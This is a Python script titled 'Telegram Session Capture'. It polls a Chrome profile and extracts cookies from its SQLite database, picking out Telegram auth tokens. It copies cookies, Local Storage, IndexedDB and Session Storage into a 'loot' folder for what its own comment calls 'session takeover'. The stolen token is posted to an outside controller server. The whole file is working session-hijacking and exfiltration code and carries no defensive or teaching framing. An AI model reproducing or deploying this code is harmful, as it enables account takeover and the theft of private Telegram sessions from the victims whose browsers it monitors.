#!/usr/bin/env python3
"""
Telegram Session Capture - Monitors for Telegram Web login
"""

import os
import sys
import time
import json
import sqlite3
import shutil
import requests
import hashlib
from pathlib import Path
from datetime import datetime

CHROME_PROFILE = Path("/root/.config/google-chrome/Default")
LOOT_DIR = Path("/app/loot")
CONTROLLER_URL = os.environ.get("CONTROLLER_URL", "http://controller:5000")
SESSION_ID = os.environ.get("SESSION_ID", "session_1")
CHECK_INTERVAL = 3

# Track state
session_captured = False


def get_chrome_cookies():
    """Extract cookies from Chrome"""
    cookies = []
    cookies_db = CHROME_PROFILE / "Cookies"
    
    if not cookies_db.exists():
        return cookies
    
    temp_db = Path("/tmp/cookies_copy.sqlite")
    try:
        shutil.copy2(cookies_db, temp_db)
        conn = sqlite3.connect(str(temp_db))
        conn.text_factory = lambda b: b.decode(errors='ignore')
        cursor = conn.cursor()
        
        cursor.execute("""
            SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly
            FROM cookies
        """)
        
        for row in cursor.fetchall():
            cookies.append({
                "domain": row[0],
                "name": row[1],
                "value": row[2],
                "path": row[3],
                "expiry": row[4],
                "secure": bool(row[5]),
                "httpOnly": bool(row[6])
            })
        conn.close()
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
    finally:
        if temp_db.exists():
            temp_db.unlink()
    
    return cookies


def get_telegram_local_storage():
    """Get Telegram session data from localStorage"""
    storage = {}
    ls_path = CHROME_PROFILE / "Local Storage" / "leveldb"
    
    if not ls_path.exists():
        return storage
    
    # Try to read from IndexedDB for Telegram
    idb_path = CHROME_PROFILE / "IndexedDB"
    if idb_path.exists():
        for db_dir in idb_path.iterdir():
            if "telegram" in db_dir.name.lower():
                storage["indexeddb_path"] = str(db_dir)
    
    return storage


def get_telegram_token(cookies):
    """Extract Telegram auth token from cookies"""
    # Look for any Telegram-related cookie that might be the token
    for cookie in cookies:
        domain = cookie.get("domain", "").lower()
        name = cookie.get("name", "").lower()
        value = cookie.get("value", "")
        
        # Telegram Web stores auth in various places
        if "telegram" in domain and value and len(value) > 50:
            # Return the longest value (likely the token)
            return value
    
    # If no long value found, return any Telegram cookie
    for cookie in cookies:
        domain = cookie.get("domain", "").lower()
        value = cookie.get("value", "")
        if "telegram" in domain and value:
            return value
    
    return None


def export_session():
    """Export everything needed for Telegram session takeover"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    export_dir = LOOT_DIR / SESSION_ID / f"telegram_{timestamp}"
    export_dir.mkdir(parents=True, exist_ok=True)
    
    # Copy Chrome data
    items_to_copy = [
        "Cookies",
        "Local Storage",
        "IndexedDB", 
        "Session Storage",
        "Preferences"
    ]
    
    for item in items_to_copy:
        src = CHROME_PROFILE / item
        dst = export_dir / item
        if src.exists():
            try:
                if src.is_dir():
                    shutil.copytree(src, dst)
                else:
                    shutil.copy2(src, dst)
            except Exception as e:
                print(f"Copy error {item}: {e}", file=sys.stderr)
    
    # Copy Local State
    local_state = CHROME_PROFILE.parent / "Local State"
    if local_state.exists():
        shutil.copy2(local_state, export_dir / "Local State")
    
    return str(export_dir)


def send_to_controller(data_type, data):
    """Send to controller"""
    try:
        response = requests.post(
            f"{CONTROLLER_URL}/api/report",
            json={
                "session_id": SESSION_ID,
                "type": data_type,
                "timestamp": datetime.now().isoformat(),
                "data": data
            },
            timeout=5
        )
        return response.status_code == 200
    except Exception as e:
        print(f"Send error: {e}", file=sys.stderr)
        return False


def main():
    global session_captured
    
    print(f"[TG Monitor] Starting...", flush=True)
    print(f"[TG Monitor] Profile: {CHROME_PROFILE}", flush=True)
    print(f"[TG Monitor] Controller: {CONTROLLER_URL}", flush=True)
    print(f"[TG Monitor] Session ID: {SESSION_ID}", flush=True)
    
    (LOOT_DIR / SESSION_ID).mkdir(parents=True, exist_ok=True)
    
    check_count = 0
    
    while True:
        try:
            if session_captured:
                time.sleep(10)
                continue
            
            check_count += 1
            
            cookies = get_chrome_cookies()
            token = get_telegram_token(cookies)
            
            # Check Local Storage for Telegram auth
            ls_path = CHROME_PROFILE / "Local Storage" / "leveldb"
            has_local_storage = False
            if ls_path.exists():
                ls_size = sum(f.stat().st_size for f in ls_path.rglob('*') if f.is_file())
                if ls_size > 5000:
                    has_local_storage = True
            
            # Log status every 10 checks
            if check_count % 10 == 0:
                tg_cookies = [c for c in cookies if "telegram" in c.get("domain", "").lower()]
                print(f"[TG Monitor] Check #{check_count}: cookies={len(cookies)}, tg_cookies={len(tg_cookies)}, has_token={token is not None}, ls={has_local_storage}", flush=True)
                if tg_cookies:
                    for c in tg_cookies[:3]:
                        print(f"[TG Monitor]   - {c.get('name')}: {c.get('value')[:50] if c.get('value') else 'empty'}", flush=True)
            
            # Detect session: have token AND local storage
            session_detected = token is not None and has_local_storage
            
            if session_detected and not session_captured:
                print(f"[TG Monitor] *** TOKEN CAPTURED! ***", flush=True)
                print(f"[TG Monitor] Token: {token[:50]}...", flush=True)
                
                session_captured = True
                
                # Send token to controller
                result = send_to_controller("telegram_token", {
                    "token": token
                })
                print(f"[TG Monitor] Sent to controller: {result}", flush=True)
        
        except Exception as e:
            print(f"[TG Monitor] Error: {e}", file=sys.stderr, flush=True)
            import traceback
            traceback.print_exc()
        
        time.sleep(CHECK_INTERVAL)


if __name__ == "__main__":
    main()
